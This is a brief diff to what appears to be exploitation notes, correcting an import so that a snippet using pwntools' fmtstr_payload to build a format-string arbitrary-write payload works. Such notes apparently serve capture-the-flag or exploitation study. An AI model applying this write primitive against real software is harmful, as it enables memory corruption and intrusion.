@@ -39,7 +39,7 @@ def arb_read(addr):
 
 **Arbitrary write primitive:**
 ```python
-from pwntools import fmtstr_payload
+from pwn import fmtstr_payload
 payload = fmtstr_payload(offset, {target_addr: value})
 ```
 
